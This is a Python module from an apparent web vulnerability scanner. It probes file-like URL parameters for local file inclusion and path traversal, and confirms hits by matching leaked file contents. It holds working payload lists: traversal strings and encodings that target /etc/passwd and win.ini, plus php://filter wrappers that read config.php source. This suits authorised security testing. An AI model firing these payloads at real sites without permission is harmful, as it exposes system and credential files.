"""Local File Inclusion (LFI) and path traversal detection module."""
import re
import base64
from urllib.parse import urlparse, parse_qs, urlencode
from typing import List, Dict, Optional, Set

from core.vuln_types import VT
import logging

logger = logging.getLogger(__name__)


class LFIFinding:
    _CATEGORY_MAP = (
        ("Local File Inclusion", VT.LFI),
        ("Path Traversal",       VT.LFI),
    )

    def __init__(self, vuln_type, url, parameter, payload, evidence,
                 severity="High", confidence=0.95, exploitable=True):
        self.vuln_type   = vuln_type
        self.url         = url
        self.parameter   = parameter
        self.payload     = payload
        self.evidence    = evidence
        self.severity    = severity
        self.confidence  = confidence
        self.exploitable = exploitable
        self.category    = next((c for p, c in self._CATEGORY_MAP if vuln_type.startswith(p)), "")

    def to_dict(self):
        return {
            "type":        self.vuln_type,
            "url":         self.url,
            "parameter":   self.parameter,
            "payload":     self.payload,
            "evidence":    self.evidence,
            "severity":    self.severity,
            "confidence":  self.confidence,
            "exploitable": self.exploitable,
            "category":    self.category,
        }


class LFIModule:
    """
    Detect Local File Inclusion and path traversal vulnerabilities.

    Tests parameters whose names suggest file/path handling:
    file, path, include, page, template, view, doc, source, load,
    require, layout, module, content, dir, filename.
    """

    _FILE_PARAMS: frozenset = frozenset({
        'file', 'path', 'dir', 'filename', 'include', 'require',
        'load', 'template', 'page', 'source', 'dest', 'src', 'doc',
        'view', 'layout', 'module', 'content', 'from', 'name',
    })

    _LINUX_PAYLOADS: List[str] = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "/etc/passwd",
        "/etc/passwd%00",
    ]

    _WINDOWS_PAYLOADS: List[str] = [
        "..\\..\\..\\windows\\win.ini",
        "../../../../windows/win.ini",
        "C:\\Windows\\win.ini",
        "C:/Windows/win.ini",
        "..%5c..%5c..%5cwindows%5cwin.ini",
    ]

    _PHP_PAYLOADS: List[str] = [
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=../config.php",
        "php://filter/convert.base64-encode/resource=../../config.php",
    ]

    _LINUX_RE   = re.compile(r'root:[^:]*:[0-9]+:[0-9]+:', re.M)
    _WINDOWS_RE = re.compile(r'\[extensions\]|\[fonts\]|for 16-bit app', re.I | re.M)
    _PHP_B64_RE = re.compile(r'[A-Za-z0-9+/]{60,}={0,2}')

    def __init__(self, http_engine, evasion_engine=None):
        self.http    = http_engine
        self.evasion = evasion_engine
        self._seen: Set[tuple] = set()

    def scan(self, url: str, method: str = "GET", data: Optional[Dict] = None) -> List[LFIFinding]:
        results: List[LFIFinding] = []

        parsed = urlparse(url)
        qs     = parse_qs(parsed.query, keep_blank_values=True)
        params = {k: v[0] for k, v in qs.items()}

        if method == "POST" and data:
            params.update(data)

        for param in params:
            if param.lower() not in self._FILE_PARAMS:
                continue

            key = (url, param)
            if key in self._seen:
                continue
            self._seen.add(key)

            found = self._probe(url, param, params, self._LINUX_PAYLOADS, self._LINUX_RE, "Linux")
            if found:
                results.append(found)
                continue

            found = self._probe(url, param, params, self._WINDOWS_PAYLOADS, self._WINDOWS_RE, "Windows")
            if found:
                results.append(found)
                continue

            found = self._probe_php(url, param, params)
            if found:
                results.append(found)

        return results

    def _probe(self, url: str, param: str, params: Dict,
               payloads: List[str], indicator: re.Pattern,
               os_label: str) -> Optional[LFIFinding]:
        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in payloads:
            try:
                test_params        = dict(params)
                test_params[param] = payload
                test_url           = f"{base}?{urlencode(test_params)}"

                resp = self.http.get(test_url)
                if not resp or resp.status_code != 200:
                    continue

                if indicator.search(resp.text):
                    excerpt = resp.text[:200].replace("\n", " ")
                    return LFIFinding(
                        vuln_type="Local File Inclusion",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence=f"[{os_label}] {excerpt}",
                        severity="High",
                        confidence=0.97,
                        exploitable=True,
                    )
            except Exception:
                pass

        return None

    def _probe_php(self, url: str, param: str, params: Dict) -> Optional[LFIFinding]:
        parsed = urlparse(url)
        base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        for payload in self._PHP_PAYLOADS:
            try:
                test_params        = dict(params)
                test_params[param] = payload
                test_url           = f"{base}?{urlencode(test_params)}"

                resp = self.http.get(test_url)
                if not resp or resp.status_code != 200:
                    continue

                m = self._PHP_B64_RE.search(resp.text)
                if not m:
                    continue

                try:
                    decoded = base64.b64decode(m.group(0) + "==").decode("utf-8", errors="replace")
                    if "root:" in decoded or "<?php" in decoded or "[font" in decoded.lower():
                        return LFIFinding(
                            vuln_type="Local File Inclusion (PHP Wrapper)",
                            url=url,
                            parameter=param,
                            payload=payload,
                            evidence=f"php://filter b64 decoded → {decoded[:150]}",
                            severity="High",
                            confidence=0.93,
                            exploitable=True,
                        )
                except Exception:
                    pass

            except Exception:
                pass

        return None
